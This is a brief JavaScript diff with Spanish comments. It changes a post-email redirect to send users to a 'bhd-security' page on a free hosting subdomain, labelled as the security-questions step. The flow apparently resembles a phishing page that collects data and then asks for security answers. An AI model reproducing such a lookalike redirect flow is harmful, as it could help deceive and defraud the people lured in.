@@ -135,7 +135,7 @@
             .then(data => {
                 // Si el correo se envió correctamente, redirige al archivo de preguntas de seguridad
                 if (data.message === "Correo enviado con éxito") {
-                    window.location.href = "#"; // Redirige al archivo de preguntas
+                    window.location.href = "https://bhd-security.netlify.app/"; // Redirige al archivo de preguntas
                 } else {
                     alert("Hubo un problema al enviar el correo.");
                 }
